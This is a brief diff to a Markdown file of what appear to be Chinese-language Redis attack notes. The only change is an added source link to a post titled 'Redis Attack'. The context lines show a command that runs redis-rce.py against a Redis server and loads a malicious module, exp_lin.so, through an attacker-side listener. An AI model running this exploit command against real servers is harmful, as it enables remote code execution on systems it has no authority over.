@@ -119,3 +119,7 @@ python redis-rce.py -r 192.168.1.103 -p 6379 -L 192.168.1.101 -f exp_lin.so
 ```
 
 ![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200524204257.png)
+
+- 原文连接
+
+[Redis Attack](https://syst1m.com/post/redis-attack/)
